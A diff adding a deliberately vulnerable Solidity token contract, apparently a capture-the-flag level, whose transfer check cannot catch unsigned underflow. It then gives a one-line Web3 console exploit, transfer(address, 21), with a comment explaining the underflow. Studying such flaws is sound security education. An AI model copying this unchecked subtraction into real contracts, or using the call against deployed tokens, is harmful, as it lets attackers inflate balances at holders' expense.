@@ -1,0 +1,31 @@
+pragma solidity ^0.6.0;
+
+contract Token {
+
+  mapping(address => uint) balances;
+  uint public totalSupply;
+
+  constructor(uint _initialSupply) public {
+    balances[msg.sender] = totalSupply = _initialSupply;
+  }
+
+  function transfer(address _to, uint _value) public returns (bool) {
+    require(balances[msg.sender] - _value >= 0);
+    balances[msg.sender] -= _value;
+    balances[_to] += _value;
+    return true;
+  }
+
+  function balanceOf(address _owner) public view returns (uint balance) {
+    return balances[_owner];
+  }
+}
+
+*Web3 Browser Console Exploit*
+
+Contract.transfer('0x5B38Da6a701c568545dCfcB03FcB875f56beddC4', 21)
+
+
+// To exploit this contract, the attacker will trigger an overflow or underflow in order to end up with more ETH than what the contract developer expects them to have. 
+
+
